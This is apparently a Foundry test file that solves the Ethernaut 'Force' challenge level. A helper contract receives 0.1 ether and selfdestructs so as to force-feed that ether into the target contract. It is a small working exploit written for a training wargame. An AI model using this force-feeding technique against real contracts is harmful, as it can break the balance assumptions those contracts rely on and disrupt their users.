// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/07-Force/ForceFactory.sol";
import "../core/Ethernaut.sol";

contract ForceTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testForceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // There is several ways to force feed ether to a contract
        // 1. Selfdestruct
        // 2. Pre-calculated Deployments
        // 3. Block Rewards and Coinbase
        // source: https://consensys.github.io/smart-contract-best-practices/attacks/force-feeding/
        // Here, selfdestruct will be used

        // Create a contract that will selfdestruct
        Selfdestructor selfdestructor = new Selfdestructor(address(ethernautForce));
        // Send ether to the contract
        address(selfdestructor).call{value: 0.1 ether}("");
        // Selfdestruct and send ether to target
        selfdestructor.forceFeeding();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Selfdestructor {
    address payable force;

    constructor(address _force) {
        require(_force.code.length > 0, "Not a contract");
        force = payable(_force);
    }

    function forceFeeding() external {
        selfdestruct(force);
    }

    receive() external payable {}
}
